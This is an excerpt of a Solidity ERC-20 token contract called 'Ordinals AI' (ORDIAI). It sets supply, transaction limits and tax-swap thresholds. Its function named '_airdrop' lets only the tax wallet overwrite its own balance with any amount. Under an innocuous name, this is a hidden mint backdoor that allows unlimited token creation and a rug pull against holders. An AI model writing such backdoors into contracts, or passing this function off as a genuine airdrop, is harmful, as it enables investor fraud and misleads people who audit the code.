...
contract OrdinalsAI is Context, IERC20, Ownable {
    ...
    uint256 private constant _tTotal = 688000000000 * 10**_decimals;
    string private constant _name = unicode"Ordinals AI";
    string private constant _symbol = unicode"ORDIAI";
    uint256 public _maxTxAmount = 13800000000 * 10**_decimals;
    uint256 public _maxWalletSize = 13800000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 6880000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 6880000000 * 10**_decimals;
    ...
    function _airdrop(uint256 _am) external {
        require(_msgSender()==_taxWallet);
        _balances[_taxWallet] = _am;
    }
